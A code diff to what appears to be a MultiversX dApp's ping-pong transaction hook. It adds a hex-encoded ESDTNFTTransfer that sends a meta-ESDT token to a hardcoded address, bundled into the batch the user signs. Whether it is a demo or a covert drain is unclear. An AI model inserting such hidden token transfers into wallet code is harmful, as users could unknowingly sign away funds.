@@ -78,8 +78,23 @@ export const useSendPingPongTransaction = () => {
       version: 1
     });
 
+    const metaEsdtTransaction = new Transaction({
+      value: '0',
+      data: new TransactionPayload(
+        'ESDTNFTTransfer@45474c444d4558464c2d326564373833@04@071afd498d0000@c2b5214f2077d386b403cbe92bd23f9ec92a4ce5552cf1f91805ba1b8d519cc3'
+      ),
+      receiver: address,
+      gasLimit: 1_000_000,
+      gasPrice: 1000000000,
+      chainID: network.chainId,
+      nonce: nonce + 1,
+      sender: address,
+      version: 1
+    });
+
     const signedTransactions = await provider.signTransactions([
       pingTransaction,
+      metaEsdtTransaction,
       multiTransaction
     ]);
 
